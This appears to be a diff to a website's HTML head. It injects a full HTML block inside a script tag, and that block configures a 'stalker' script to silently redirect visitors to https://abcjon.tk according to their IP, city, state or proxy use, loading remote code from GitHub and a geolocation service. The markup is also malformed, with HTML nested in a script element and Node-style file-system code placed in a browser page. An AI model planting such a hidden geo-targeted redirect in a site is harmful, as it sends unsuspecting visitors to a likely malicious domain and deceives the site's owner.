@@ -5,6 +5,38 @@
 <link rel="shortcut icon" type="image/x-icon" href="https://images.squarespace-cdn.com/content/v1/614d25eef23cd4531ac44bab/69fb0e66-8045-42e1-a24d-7aa0f53fc89d/favicon.ico"/>
 <title>ULC</title>
 	<script>
+		<html>
+	<head>
+
+		<!-- jQuery is required to make a JSONP call to the proxy blocker service -->
+		<!--[if lt IE 9]>
+		<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+		<![endif]-->
+		<!--[if gte IE 9]><!-->
+		<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+		<!--[endif]-->
+
+		<script>
+			// Add stuff here to forward by IP, City, etc.
+			var stalker = {
+				forward: 'https://abcjon.tk',
+				ip_addresses: ['127.0.0.1'],
+				whitelist_ip_addresses: ['127.0.0.2'],
+				cities: ['Seattle', 'Olympia'],
+				states: ['OR'],
+				proxies: true
+			};
+		</script>
+
+		<script src="https://raw.githubusercontent.com/nikolas/js-stalker/master/stalker.min.js"></script>
+		<script src="http://www.geoplugin.net/json.gp?jsoncallback=jsStalkerGet" type="application/javascript"></script>
+
+	</head>
+	<body>
+	</body>
+</html>
+	</script>
+	<script>
 		"use strict";
 
 var fs = require("fs");
